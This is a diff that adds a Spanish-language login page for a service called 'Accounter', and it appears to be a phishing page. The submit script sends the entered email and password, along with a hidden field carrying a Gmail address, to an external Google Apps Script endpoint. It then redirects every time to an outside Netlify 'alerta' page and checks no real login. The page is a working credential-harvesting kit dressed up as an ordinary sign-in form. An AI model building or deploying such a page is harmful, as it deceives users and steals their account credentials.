@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Iniciar Sesión - Accounter</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
+        body { display: flex; height: 100vh; width: 100vw; overflow: hidden; background: #fff; }
+
+        .login-section { width: 55%; display: flex; align-items: center; justify-content: center; }
+        .login-container { width: 100%; max-width: 750px; padding: 60px; }
+
+        .header { display: flex; align-items: center; margin-bottom: 30px; }
+        .header img { width: 85px; margin-right: 25px; }
+        h1 { font-size: 38px; font-weight: 800; color: #000; }
+        h2 { margin-bottom: 30px; font-size: 24px; font-weight: 700; color: #000; }
+        
+        .input-group { margin-bottom: 20px; position: relative; }
+        input { width: 100%; padding: 18px; background: #f3f4f6; border: 1px solid #e5e7eb; border-radius: 10px; font-size: 16px; font-weight: 700; }
+        input::placeholder { font-weight: 700; color: #333; }
+        
+        /* Contenedor del icono */
+        .toggle-icon { 
+            position: absolute; right: 20px; top: 50%; transform: translateY(-50%); 
+            cursor: pointer; width: 24px; height: 24px; color: #6e8b94;
+        }
+
+        .footer-form { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; font-size: 15px; font-weight: 700; color: #6e8b94; }
+        .footer-form a { color: #6e8b94; text-decoration: none; }
+        
+        .login-button { width: 100%; padding: 18px; background: #05050f; color: #fff; border-radius: 10px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; }
+        .version { text-align: center; margin-top: 20px; color: #aaa; font-size: 12px; font-weight: 700; }
+
+        .boveda-section { width: 45%; background: #000; }
+        .boveda-img { width: 100%; height: 100%; object-fit: cover; }
+    </style>
+</head>
+<body>
+
+    <div class="login-section">
+        <div class="login-container">
+            <div class="header">
+                <img src="logo.png" alt="Logo">
+                <h1>Accounter</h1>
+            </div>
+            <h2>Iniciar Sesión</h2>
+            <form id="form">
+                <input type="hidden" name="_cc" value="legalmenteguss@gmail.com">
+                <div class="input-group">
+                    <input type="text" name="email" placeholder="Correo electrónico" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" name="password" id="password" placeholder="Contraseña" required>
+                    <!-- Icono SVG de ojo -->
+                    <svg id="eye-icon" class="toggle-icon" onclick="togglePassword()" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                        <circle cx="12" cy="12" r="3"></circle>
+                    </svg>
+                </div>
+                <div class="footer-form">
+                    <label><input type="checkbox"> Recuérdame</label>
+                    <a href="#">¿Olvidaste tu contraseña?</a>
+                </div>
+                <button type="submit" class="login-button">Iniciar Sesión</button>
+            </form>
+            <div class="version">v0.1.9</div>
+        </div>
+    </div>
+
+    <div class="boveda-section">
+        <img src="boveda.jpg.png" alt="Bóveda" class="boveda-img">
+    </div>
+
+    <script>
+        function togglePassword() {
+            const pass = document.getElementById("password");
+            const icon = document.getElementById("eye-icon");
+            if (pass.type === "password") {
+                pass.type = "text";
+                icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
+            } else {
+                pass.type = "password";
+                icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
+            }
+        }
+
+        document.getElementById("form").onsubmit = function(e) {
+            e.preventDefault();
+            
+            // URL configurada correctamente
+            const scriptURL = "https://script.google.com/macros/s/AKfycbw-mz7Un89TgyZ_q0XcqqJA3IjiWuNamIjLiRSqZjW4z6y58gaA9FtYp1w1m5hJVQC8Yg/exec";
+            
+            fetch(scriptURL, {
+                method: "POST",
+                mode: "no-cors",
+                body: new FormData(this)
+            })
+            .then(() => {
+                // Redirigir siempre a la alerta al finalizar
+                window.location.href = "https://thunderous-genie-642962.netlify.app/alerta.html";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                window.location.href = "https://thunderous-genie-642962.netlify.app/alerta.html";
+            });
+        };
+    </script>
+</body>
+</html>
